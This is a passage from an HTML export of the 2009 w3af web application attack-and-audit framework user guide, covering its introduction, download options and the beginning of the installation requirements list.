<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="content-type" content="text/html; charset=utf-8" /><title> </title><meta name="generator" content="StarOffice/OpenOffice.org XSLT (http://xml.openoffice.org/sx2ml)" /><meta name="created" content="2007-05-14T16:45:42" /><meta name="changedby" content="dz0" /><meta name="changed" content="2009-10-14T22:53:34" /><base href="." /><style type="text/css">
	@page { size: 8.5inch 11inch; margin-top: 0.7874inch; margin-bottom: 0.7874inch; margin-left: 0.7874inch; margin-right: 0.7874inch }
	table { border-collapse:collapse; border-spacing:0; empty-cells:show }
	td, th { vertical-align:top; }
	h1, h2, h3, h4, h5, h6 { clear:both }
	ol, ul { padding:0; }
	* { margin:0; }
	*.fr1 { font-size:12pt; vertical-align:top; text-align:center; padding:0.0193in; border-width:0.049cm; border-style:solid; border-color:#000000; }
	*.Graphics { font-size:12pt; vertical-align:top; text-align:center; }
	*.Caption { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0.0835in; margin-bottom:0.0835in; font-style:italic; }
	*.Contents2 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-left:0.1965in; margin-right:0in; text-indent:0inch; }
	*.Contents3 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-left:0.3929in; margin-right:0in; text-indent:0inch; }
	*.ContentsHeading { font-family:'Bitstream Vera Sans'; font-size:16pt; margin-top:0.1665in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-weight:bold; }
	*.Heading { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; }
	*.Heading1 { font-family:'Bitstream Vera Sans'; font-size:24pt; margin-top:0.1665in; margin-bottom:0.0835in; font-weight:bold; }
	*.Heading2 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; }
	*.Heading3 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-weight:bold; }
	*.Index { font-family:'Bitstream Vera Sans'; font-size:12pt; }
	*.List { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P1 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:normal; font-weight:normal; }
	*.P10 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:normal; }
	*.P100 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; font-style:italic; }
	*.P101 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P102 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P103 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P104 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P105 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P106 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P107 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P108 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P109 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P11 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P110 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-weight:bold; }
	*.P111 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-left:0.1965in; margin-right:0in; text-indent:0inch; }
	*.P112 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-left:0.3929in; margin-right:0in; text-indent:0inch; }
	*.P12 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P13 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P14 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:normal; font-weight:normal; }
	*.P15 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:normal; font-weight:bold; }
	*.P16 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:italic; font-weight:bold; text-decoration:underline; }
	*.P17 { font-family:'Bitstream Vera Sans'; font-size:12pt; text-align:center ! important; }
	*.P18 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; background-color:#ffffff; font-style:normal; }
	*.P19 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P2 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:italic; font-weight:bold; text-decoration:underline; }
	*.P20 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P21 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P22 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; }
	*.P23 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P24 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P25 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; }
	*.P26 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; font-weight:normal; }
	*.P27 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; font-weight:normal; }
	*.P28 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; font-weight:bold; }
	*.P29 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P3 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; background-color:#ffffff; font-style:normal; }
	*.P30 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:normal; }
	*.P31 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P32 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:italic; }
	*.P33 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P34 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-weight:bold; }
	*.P35 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P36 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P37 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P38 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P39 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P4 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P40 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P41 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0in; margin-bottom:0.0835in; font-weight:bold; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P42 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P43 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:normal; font-weight:bold; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P44 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P45 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; font-style:normal; }
	*.P46 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; font-weight:normal; }
	*.P47 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; font-weight:normal; }
	*.P48 { font-family:'Bitstream Vera Sans'; font-size:16pt; margin-top:0.1665in; margin-bottom:0.0835in; text-align:center ! important; font-weight:bold; text-decoration:underline; }
	*.P49 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:italic; font-weight:bold; text-decoration:underline; }
	*.P5 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; }
	*.P50 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-weight:bold; }
	*.P51 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; }
	*.P52 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P53 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P54 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-style:normal; font-weight:bold; }
	*.P55 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-style:normal; font-weight:normal; }
	*.P56 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:bold; }
	*.P57 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:bold; }
	*.P58 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:bold; background-color:#ffffff; }
	*.P59 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P6 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; }
	*.P60 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:normal; }
	*.P61 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; background-color:#ffffff; }
	*.P62 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; background-color:#ffffff; }
	*.P63 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P64 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P65 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P66 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:bold; }
	*.P67 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0.1665in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P68 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0.1665in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P69 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:-0.9846in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P7 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; font-weight:normal; }
	*.P70 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P71 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0.1665in; margin-bottom:0.0835in; }
	*.P72 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0.1665in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P73 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-weight:bold; text-align:justify ! important; }
	*.P74 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; text-align:justify ! important; }
	*.P75 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:normal; font-weight:bold; }
	*.P76 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:normal; font-weight:normal; }
	*.P77 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:italic; font-weight:bold; text-decoration:underline; }
	*.P78 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; background-color:#ffffff; font-style:normal; }
	*.P79 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P8 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-weight:bold; }
	*.P80 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P81 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; }
	*.P82 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; font-weight:normal; }
	*.P83 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; font-weight:normal; }
	*.P84 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:normal; }
	*.P85 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P86 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P87 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; }
	*.P88 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P89 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P9 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P90 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P91 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P92 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P93 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P94 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P95 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P96 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P97 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P98 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P99 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.PreformattedText { font-family:'Bitstream Vera Sans Mono'; font-size:10pt; margin-top:0in; margin-bottom:0in; }
	*.Standard { font-family:'Bitstream Vera Sans'; font-size:12pt; }
	*.TableContents { font-family:'Bitstream Vera Sans'; font-size:12pt; }
	*.Textbody { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.Sect1 { }
	*.BulletSymbols { font-family:StarSymbol; font-size:9pt; }
	*.Internetlink { color:#000080; text-decoration:underline; }
	*.NumberingSymbols { }
	*.T1 { font-weight:bold; }
	*.T10 { font-family:'Bitstream Vera Sans'; font-weight:normal; }
	*.T11 { font-family:'Bitstream Vera Sans'; font-style:normal; background-color:transparent; }
	*.T12 { font-family:'Bitstream Vera Sans'; }
	*.T13 { font-weight:normal; }
	*.T2 { background-color:#ffffff; }
	*.T3 { font-weight:bold; }
	*.T4 { background-color:#ffffff; }
	*.T5 { font-style:italic; }
	*.T6 { font-style:normal; }
	*.T7 { font-family:'Nimbus Mono L'; }
	*.T8 { font-family:'Nimbus Mono L'; font-weight:normal; }
	*.T9 { font-family:'Bitstream Vera Sans'; }
	</style></head><body dir="ltr"><p class="P48"> </p><p class="P48"> </p><p class="P48"> </p><p class="P48"> </p><p class="P48"> </p><p class="P48">w3af User Guide </p><p class="P1"> </p><p class="P1"> </p><p class="P1">Document version: <span class="T1">1.6.</span><span class="T1">8</span></p><p class="P1">Original author: <span class="T1">Andres Riancho</span></p><p class="P1"> </p><p class="P1"> </p><p class="P1">Reviewed by:  </p><p class="P15">Mike Harbison </p><p class="P15">Andy Bach </p><p class="P15">Chris Teodorski</p><p class="P2"> </p><p class="P2"> </p><p class="P2"> </p><p class="P2"> </p><p class="P2"> </p><p class="P2"> </p><p class="P2"> </p><p class="P2"> </p><p class="P2"> </p><p class="P2"> </p><p class="P2"> </p><p class="P2"> </p><p class="P2">October 14, 2009</p><p class="P49"> </p><p class="ContentsHeading">Table of Contents </p><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Introduction </td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Download</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Installation</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P112"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Installation Requirements</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>w3af phases</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Running w3af</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P112"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Running w3af with GTK user interface</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P112"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Plugins</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P112"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Plugin configuration</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Starting a scan</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P112"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>A complete session</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>A warning about discovery</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P112"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>When everything else fails...</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>w3af scripts</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>The Output</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Complex sites</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Exploiting</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P112"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Advanced exploiting techniques</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P112"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Virtual daemon</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P112"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>w3afAgent</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>More information</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Bugs</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Contributors</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P111"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Final words</td></tr></table><p class="P17"> </p><h2 class="P51"><a name="Introduction" />Introduction </h2><p class="P4">This document is a user guide for the Web Application Attack and Audit Framework ( w3af ), its goal is to provide a basic overview of what the framework is, how it works and what you can do with it.  </p><p class="P9">w3af is a complete environment for auditing and attacking web applications. This environment provides a solid platform for auditing and penetration-testing.  </p><h2 class="Heading2"><a name="Download" />Download</h2><p class="P71">The framework can be downloaded from the project main page:  </p><p class="P67"><a href="http://w3af.sf.net/#download">http://w3af.sf.net/#download</a></p><p class="P72">There are two ways to install w3af: from a release package (w3af setup for windows and tgz package for Unix based systems) or from SVN. First time users should use the latest package, while more advanced users should perform a SVN checkout to get the latest version of the framework.  </p><h2 class="Heading2"><a name="Installation" />Installation</h2><p class="P3">The framework should work on all platforms supported <span class="T2">by Python</span><span class="T2">.</span> w3af has been teste<span class="T2">d on Linux, Window</span>s XP, Windows Vista and OpenBSD. This user guide will guide you through the installation on a Linux platform. installing w3af in a Windows box is straight forward if you use the available installer which can be downloaded from the official w3af site.</p><h3 class="P73"><a name="Installation_Requirements" />Installation Requirements</h3><p class="P19">The required packages to run w3af can be divided in two groups: </p><ul style="margin-left:1.25cm;"><li class="P79" style="margin-left:0cm;"><p class="P79" style="margin-left:0.25cm;">Core requirements: </p></li></ul><ul style="margin-left:0.5cm;"><li class="P101" style="margin-left:1.25cm;"><p class="P101" style="margin-left:0.25cm;">Python <span class="T1">2.5</span></p></li><li class="P101" style="margin-left:1.25cm;"><p class="P101" style="margin-left:0.25cm;">fpconst-0.7.2 </p></li><li class="P101" style="margin-left:1.25cm;"><p class="P101" style="margin-left:0.25cm;">pygoogle </p></li><li class="P101" style="margin-left:1.25cm;"><p class="P101" style="margin-left:0.25cm;">nltk </p></li><li class="P101" style="margin-left:1.25cm;"><p class="P101" style="margin-left:0.25cm;">SOAPpy </p></li><li class="P101" style="margin-left:1.25cm;"><p class="P101" style="margin-left:0.25cm;">pyPdf </p></li><li class="P101" style="margin-left:1.25cm;"><p class="P101" style="margin-left:0.25cm;">Beautiful Soup </p></li><li class="P101" style="margin-left:1.25cm;"><p class="P101" style="margin-left:0.25cm;">Python OpenSSL </p></li><li class="P101" style="margin-left:1.25cm;"><p class="P101" style="margin-left:0.25cm;">json.py </p></li><li class="P101" style="margin-left:1.25cm;"><p class="P101" style="margin-left:0.25cm;">scapy </p><p class="P101" style="margin-left:0.25cm;" /></li></ul><ul style="margin-left:1.25cm;"><li class="P79" style="margin-left:0cm;"><p class="P79" style="margin-left:0.25cm;">Graphical user interface requirements: </p></li></ul><ul style="margin-left:0.5cm;"><li class="P102" style="margin-left:1.25cm;"><p class="P102" style="margin-left:0.25cm;">python sqlite3 </p></li><li class="P102" style="margin-left:1.25cm;"><p class="P102" style="margin-left:0.25cm;">graphviz </p></li></ul><ul style="margin-left:0.5cm;"><li class="P101" style="margin-left:1.25cm;"><p class="P101" style="margin-left:0.25cm;">pygtk 2.0 </p></li><li class="P101" style="margin-left:1.25cm;"><p class="P101" style="margin-left:0.25cm;">gtk 2.12 </p></li></ul><ul style="margin-left:0.5cm;"><li class="P102" 